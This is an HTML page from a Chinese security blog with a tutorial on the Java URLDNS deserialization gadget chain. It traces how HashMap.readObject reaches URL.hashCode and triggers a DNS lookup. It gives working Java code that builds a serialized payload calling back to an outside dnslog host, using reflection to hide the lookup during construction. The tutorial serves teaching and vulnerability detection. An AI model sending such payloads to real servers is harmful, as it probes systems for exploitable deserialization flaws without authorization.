@@ -1,0 +1,566 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="utf-8" />
+        <title>Java安全（叁）——URLDNS链 | 小C♥天天</title>
+        <meta name="author" content="小C&天天" />
+        <meta name="description" content="^v^" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/icon.jpg" />
+        <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.4/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<!-- 兼容不同版本的浏览器 -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<!-- 高亮代码 -->
+<script src="https://cdn.staticfile.org/highlight.js/11.8.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/11.8.0/styles/github.min.css"/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<!-- 使用 KaTeX 渲染数学公式 -->
+<script src="https://cdn.staticfile.org/KaTeX/0.16.8/katex.min.js"></script>
+<script src="https://cdn.staticfile.org/KaTeX/0.16.8/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/KaTeX/0.16.8/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<!-- 简单的点击图片放大缩小的预览 -->
+<script src="/js/lib/preview.js"></script>
+
+
+<!-- 看板娘 -->
+<script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+
+
+<!-- 侧边小功能-->
+
+
+
+<!-- 评论设置 -->
+
+<script
+    src="https://giscus.app/client.js"
+    data-repo="A7cc/giscus-comments"
+    data-repo-id="R_kgDOKKSvfw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOKKSvf84CYyp2"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="layout">
+            <!-- 页面加载 -->
+            <transition name="fade">
+                <div id="loading" v-show="loading">
+                    <div id="loading-circle">
+                        <h2>LOADING</h2>
+                        <p>正在加载</p>
+                        <img src="/images/afde9fa65a5742a90b51d6e1211e841e.gif" />
+                    </div>
+                </div>
+            </transition>
+            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/tools">
+            <i class="fa-solid fa-tools fa-fw"></i>
+            <span>&ensp;工具</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/tools">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tools fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">工具</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+                <div id="article-posts-wrap" true ref="homePostsWrap">
+    <div class="article">
+        <div>
+            <h1>Java安全（叁）——URLDNS链</h1>
+        </div>
+        <div class="info">
+            <span class="date">
+                <span class="icon">
+                    <i class="fa-solid fa-calendar fa-fw"></i>
+                </span>
+                2024/6/26
+            </span>
+            
+            <span class="category">
+                <a href="/categories/Java%E5%AE%89%E5%85%A8/">
+                    <span class="icon">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </span>
+                    Java安全
+                </a>
+            </span>
+            
+            
+            <span class="tags">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                
+                
+                <span class="tag">
+                    
+                    <a href="/tags/Java/" style="color: #ff7d73">Java</a>
+                </span>
+                
+                <span class="tag">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #00bcd4">代码审计</a>
+                </span>
+                
+            </span>
+            
+        </div>
+        
+        <div class="content" v-pre>
+            <h1 id="壹-介绍"><a href="#壹-介绍" class="headerlink" title="壹 介绍"></a>壹 介绍</h1><h2 id="1-1-URLDNS链"><a href="#1-1-URLDNS链" class="headerlink" title="1.1 URLDNS链"></a>1.1 URLDNS链</h2><p>前面我们有提到，该链是原生<code>JDK</code>就存在的利用链（利用链也叫<code>gadget chains</code>，简称<code>gadget</code>），也是最简单的利用链，该链主要的目的是通过探测<code>DNS</code>的方式探测反序列化漏洞是否存在。个人猜测应该是在原生的<code>JDK</code>中找不到<code>RCE</code>了，那就降级找探测网络的方式确认漏洞。</p>
+<h2 id="1-2-原理"><a href="#1-2-原理" class="headerlink" title="1.2 原理"></a>1.2 原理</h2><p><code>URLDNS</code>链的原理就是通过<code>JDK</code>中的<code>URL</code>类内部的<code>hashCode</code>方法对传入的<code>url</code>进行域名解析，实现网络探测，这是利用链的<code>sink</code>点，然后通过<code>HashMap</code>类中重写的<code>readObject</code>方法去调用<code>map</code>的<code>key</code>值里面的<code>hashCode</code>方法，这里我们不难想到这个<code>key</code>我们可以传递一个<code>URL</code>类，使得<code>HashMap</code>类在反序列化时调用<code>URL</code>类里的<code>hashCode</code>方法实现完整的网络探测利用。可以说的有点绕口，下面我们通过代码进行详细分析。</p>
+<h1 id="贰-分析"><a href="#贰-分析" class="headerlink" title="贰 分析"></a>贰 分析</h1><h2 id="2-1-URLDNS的sink点分析"><a href="#2-1-URLDNS的sink点分析" class="headerlink" title="2.1 URLDNS的sink点分析"></a>2.1 URLDNS的sink点分析</h2><p>根据前面的原理我们知道<code>URLDNS</code>的<code>sink</code>点就在<code>java.net.URL</code>中，并且<code>java.net.URL</code>继承了<code>java.io.Serializable</code>类：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/fdd704e0046b9bae1779cf6a2200b96b.png" alt="fdd704e0046b9bae1779cf6a2200b96b.png"></p>
+<p>接着我们来查看一下该类的结构，试图找出重写的<code>readObject</code>方法，看看有没有实现第一种方式的反序列化漏洞利用条件，显然<code>URL</code>类中<code>readObject</code>方法只有一些赋值操作，没有什么利用的点，这时候我们就要找一些其他类可能用的共同方法，例如：<code>toString</code>、<code>hashCode</code>等，这时候我们找到了一个<code>hashCode</code>方法：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/affb8f00e95cddde171fadfdcb1e3548.png" alt="affb8f00e95cddde171fadfdcb1e3548.png"></p>
+<p>发现<code>hashCode</code>方法先对<code>hashCode</code>属性进行判断，然后调用<code>handler.hashCode</code>赋值给<code>hashCode</code>属性：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/16963a29ea82e93da38f71898f6dd40d.png" alt="16963a29ea82e93da38f71898f6dd40d.png"></p>
+<p>跟进<code>handler.hashCode</code>，发现<code>u</code>参数也就是前面的<code>this</code>参数没有做任何过滤直接传递给了<code>getHostAddress</code>方法，该方法是对<code>URL</code>进行域名解析，至此我们就找到了<code>URLDNS</code>的<code>sink</code>点，需要注意这里的<code>this</code>就是我们传递的<code>DNSlog</code>的<code>URL</code>：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/801ed3eb5550e1091fa58c8501d565c1.png" alt="801ed3eb5550e1091fa58c8501d565c1.png"></p>
+<h2 id="2-2-HashMap的readObject方法分析"><a href="#2-2-HashMap的readObject方法分析" class="headerlink" title="2.2 HashMap的readObject方法分析"></a>2.2 HashMap的readObject方法分析</h2><p>我们如何调用这个<code>URL</code>类内的<code>hashCode</code>方法呢？既然第一种方式的反序列化漏洞利用条件行不通，那就找第二种，也就是找到其他的入口类，通过这个入口类去调用<code>URL</code>类内的<code>hashCode</code>方法，并且该入口类在<code>readObject</code>时触发<code>URL</code>类的<code>hashCode</code>方法，那么就要要求入口类接收的参数是一个<code>URL</code>类型或者是一个<code>Object</code>类型，这里自然想到<code>Map</code>这个结构，它的<code>key</code>和<code>Value</code>可以为任意类型，而且<code>Map</code>的实现类是<code>HashMap</code>，<code>HashMap</code>也是实现了序列化接口，并且重写了<code>readObject</code>：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/af804333306356489c60a64ae70ce4c7.png" alt="af804333306356489c60a64ae70ce4c7.png"><br><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/4f5c00afbcf58b4ba05ca3572089cfcb.png" alt="4f5c00afbcf58b4ba05ca3572089cfcb.png"></p>
+<p>接着分析<code>HashMap</code>类的<code>readObject</code>方法，发现<code>readObject</code>方法调用了<code>hash()</code>的方法并且传入的参数是<code>key</code>：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/b0274bf761c6e2e232382b8b8beb570c.png" alt="b0274bf761c6e2e232382b8b8beb570c.png"></p>
+<p>跟进<code>hash</code>方法，发现方法内会调用<code>key</code>的<code>hashCode()</code>方法，也就是说我们只要把<code>key</code>值改为<code>URL</code>对象，即可调用<code>URL</code>对象的<code>hashCode()</code>方法实现网络探测。</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/e91974fa2368dfb2f7c3f28430fe685a.png" alt="e91974fa2368dfb2f7c3f28430fe685a.png"></p>
+<p>那么我们要怎么将<code>key</code>值设置为<code>URL</code>对象呢？这里我们直接通过<code>HashMap</code>的<code>put</code>方法进行设置即可。简单梳理一下：</p>
+<pre><code class="Bash">首先创建一个HashMap类，这个类就是Map结构，使用put方法以&lt;URL,xxxx&gt;的形式存放在HashMap类中，然后通过HashMap类的readObject方法调用了hash方法，最后触发到URL类中的hashCode方法，实现网络探测功能，也就是DNSlog。
+</code></pre>
+<h2 id="2-3-完整的利用链"><a href="#2-3-完整的利用链" class="headerlink" title="2.3 完整的利用链"></a>2.3 完整的利用链</h2><p>这里我们编写一个小<code>demo</code>，我们使用<code>yakit</code>自带的<code>dnslog</code>生成<code>URL</code>：</p>
+<pre><code class="Java">package com.demo.serializable;
+import java.io.*;
+import java.net.URL;
+import java.util.HashMap;
+public class Run &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        HashMap&lt;URL, Integer&gt; urlIntegerHashMap = new HashMap&lt;&gt;();
+        URL url1 = new URL(&quot;http://kunsatbady.dgrh3.cn&quot;);
+        // 这里存在一定的干扰，后面会讲解
+        urlIntegerHashMap.put(url1, 1);
+        // 序列化
+        // 新建一个文件用来存储后续序列化的数据
+        FileOutputStream fileOutputStream = new FileOutputStream(&quot;serializable.ser&quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        // 将获取到的对象进行序列化，并存入到serializable.ser文件中
+        objectOutputStream.writeObject(urlIntegerHashMap);
+
+        // 反序列化
+        // 获取file文件中的序列化内容
+        FileInputStream fileInputStream = new FileInputStream(&quot;serializable.ser&quot;);
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        // 将序列化内容转换为Java对象，并返回
+        Object o = objectInputStream.readObject();
+        System.out.println(o);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/312598fc226b32546cb8391aa2db2d48.png" alt="312598fc226b32546cb8391aa2db2d48.png"></p>
+<p>其实我们会发现，通过<code>put</code>方法将<code>&lt;URL,xxxx&gt;</code>放入到<code>HashMap</code>中时，就执行了一次网络域名解析：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/c1a54f79a833d55485240dccfb83b8d6.png" alt="c1a54f79a833d55485240dccfb83b8d6.png"><br><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/0ad30e9de941328fd981302d8e9ff6fb.png" alt="0ad30e9de941328fd981302d8e9ff6fb.png"></p>
+<p>这样很容易干扰我们后面的判断，然后不经有一个疑问：这个地方有没有反序列化漏洞呢？这时候我们要怎么去除这个<code>put</code>方法的干扰呢？我们在查看<code>sink</code>点的时候发现，当<code>URL</code>中的<code>hasCode</code>参数如果不等于<code>-1</code>的话，那么就直接返回值：</p>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/9db4eea69b885f8fae0f295cd5bbef5a.png" alt="9db4eea69b885f8fae0f295cd5bbef5a.png"><br><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/79a140670478e49b5a8237ed41cef1d9.png" alt="79a140670478e49b5a8237ed41cef1d9.png"></p>
+<p>这时候我们就想到两个方法，一个是在<code>put</code>方法之前改变这个<code>hasCode</code>参数，另一个就是直接将<code>&lt;URL,xxxx&gt;</code>放入到<code>HashMap</code>中，显然两个方法都需要通过反射修改类的内部结构，并且第一种方法要比第二种方法修改的的难度要低很多，所以我们只需要在使用<code>put</code>方法之前通过反射修改<code>hasCode</code>参数即可绕过网络解析，同样将<code>&lt;URL,xxxx&gt;</code>放入到<code>HashMap</code>中后，我们还需要将<code>hasCode</code>参数设置回<code>-1</code>，才能使得类进行反序列化时满足<code>hasCode</code>方法条件，接下来编写代码：</p>
+<pre><code class="Java">package com.demo.serializable;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+public class Run &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        HashMap&lt;URL, Integer&gt; urlIntegerHashMap = new HashMap&lt;&gt;();
+        URL url1 = new URL(&quot;http://uyfzoopobw.dgrh3.cn&quot;);
+        Class&lt;? extends URL&gt; aClass = url1.getClass();
+        Field hashCode = aClass.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        hashCode.set(url1, 1111);
+        urlIntegerHashMap.put(url1, 1);
+        hashCode.set(url1, -1);
+        // 序列化
+        // 新建一个文件用来存储后续序列化的数据
+        FileOutputStream fileOutputStream = new FileOutputStream(&quot;serializable.ser&quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        // 将获取到的对象进行序列化，并存入到serializable.ser文件中
+        objectOutputStream.writeObject(urlIntegerHashMap);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/e6dfd875eee63ecd21907c5c9d9ffafe.png" alt="e6dfd875eee63ecd21907c5c9d9ffafe.png"></p>
+<p>可以看到干扰被排除了，这时候我们进行反序列化：</p>
+<pre><code class="Java">package com.demo.serializable;
+import java.io.*;
+public class Run &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        // 反序列化
+        // 获取file文件中的序列化内容
+        FileInputStream fileInputStream = new FileInputStream(&quot;serializable.ser&quot;);
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        // 将序列化内容转换为Java对象，并返回
+        Object o = objectInputStream.readObject();
+        System.out.println(o);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/ce6046c5f0c01b9cca12960c0141d0d9.png" alt="ce6046c5f0c01b9cca12960c0141d0d9.png"></p>
+<p>其实前面序列化那一步我们只需要客户端生成，也就是我们自己生成的<code>payload</code>，后面的反序列化过程其实是服务器反序列化的过程，客户端的代码是我们可以控制的，服务端是不可以控制的，所以我们在复现时，一般只需要搭建后面的服务端，前面的客户端已经被工具化，如：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>中的<code>src/main/java/ysoserial/payloads/URLDNS.java</code>文件就是实现了，这里之所以长篇大论就是为了体现出反射在反序列化中的重要性。</p>
+<h1 id="叁-参考"><a href="#叁-参考" class="headerlink" title="叁 参考"></a>叁 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9">Java反序列化漏洞专题</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial</a></li>
+</ul>
+
+        </div>
+        
+        
+        <div id="comment">
+            <div id="giscus-container" class="giscus"></div>
+        </div>
+        
+    </div>
+    
+    <div id="article-card">
+        <div id="card-style">
+    <div id="card-div" class="card-cls">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg" alt="avatar" />
+        </div>
+        <div class="name">小C&amp;天天</div>
+        <div class="description">
+            <p>修学储能 先博后渊</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">kyrieee</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">tonyd0g</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://ruyueattention.github.io/">ruyueattention</a>
+            </span>
+            
+        </div>
+        
+    </div>
+    
+    <!-- <br /> -->
+    <!-- 目录 -->
+    <!-- 
+    <div id="card-div">
+        <div id="toc" class="toc-article">
+            <strong class="toc-title">文章目录</strong>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E4%BB%8B%E7%BB%8D"><span class="toc-text">壹 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-URLDNS%E9%93%BE"><span class="toc-text">1.1 URLDNS链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%8E%9F%E7%90%86"><span class="toc-text">1.2 原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E5%88%86%E6%9E%90"><span class="toc-text">贰 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-URLDNS%E7%9A%84sink%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-text">2.1 URLDNS的sink点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-HashMap%E7%9A%84readObject%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-text">2.2 HashMap的readObject方法分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">2.3 完整的利用链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E5%8F%82%E8%80%83"><span class="toc-text">叁 参考</span></a></li></ol>
+        </div>    
+    </div>
+     -->
+</div>
+
+<div id="card-style-fun">
+    
+    <!-- 今日诗句 -->
+    <br />
+    <div id="card-div">
+        <div class="good-sentence">
+            <div class="toolio">
+                <div class="circle"><span class="red"></span></div>
+                <div class="circle"><span class="yellow"></span></div>
+                <div class="circle"><span class="green"></span></div>
+                <div class="circle"><span class="text">今日诗句</span></div>
+            </div>
+            <div class="sentence">
+                <div id="sentenceid" onload="getsentence();"></div>
+            </div>
+        </div>
+    </div>
+    <!-- 日期信息 -->
+    <br />
+    <div id="card-div">
+        <img src="//api.vvhan.com/api/ipCard?tip=A7cc" width="300" height="180">
+    </div>
+    
+</div>
+
+
+
+    </div>
+    
+</div>
+                <!-- 页脚 -->
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            <script>
+                var now = new Date(); 
+                function createtime() { 
+                    var grt= new Date("07/10/2022 00:00:00");
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "已运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+                } 
+            setInterval("createtime()",250);
+            </script>
+        </div>
+        <div>
+            &copy;
+            2022 - 2024 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            &commat;小C&amp;天天
+        </div>
+        <div>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            <!-- 简单的点击图片放大缩小的预览 -->
+            
+            <div name="fade">
+                <div id="preview" ref="preview" v-show="previewShow">
+                    <img id="preview-content" ref="previewContent" />
+                </div>
+            </div>
+            
+        </div>
+        <!-- 看板娘 -->
+        
+        <div id="L2dCanvas"></div>
+        <script src="/js/lib/live2d.min.js"></script>
+        <!-- 设置随机模板 -->
+        
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        
+        <!-- 诗句 -->
+        
+        <script>
+            // // 每隔10分钟执行一次getsentence这个函数
+            window.setInterval(getsentence, 100*60*5);
+            function getsentence() {
+                // 这里没有考虑IE浏览器，如果需要择if判断加
+                var xhr = new XMLHttpRequest();  
+                xhr.open('GET', "https://zj.v.api.aa1.cn/api/wenan-shici/?type=json",true);
+                xhr.send(JSON.stringify(null));
+                xhr.onreadystatechange = function () {
+                    if (xhr.status === 200 && xhr.readyState === 4) {
+                        //js处理数据
+                        // xhr.responseText.match(/content":(".+?")/g)
+                        getdata = JSON.parse(xhr.responseText).msg;
+                    }else{
+                        getdata = "长风破浪会有时，直挂云帆济沧海。——李白《行路难》";
+                    }
+                    document.getElementById("sentenceid").innerHTML = getdata;
+                }
+            }
+            window.onload = getsentence;
+        </script>
+        
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/meteorbackground.js"></script>
+        
+        <script src="/js/main.js"></script>
+    </body>
+</html>
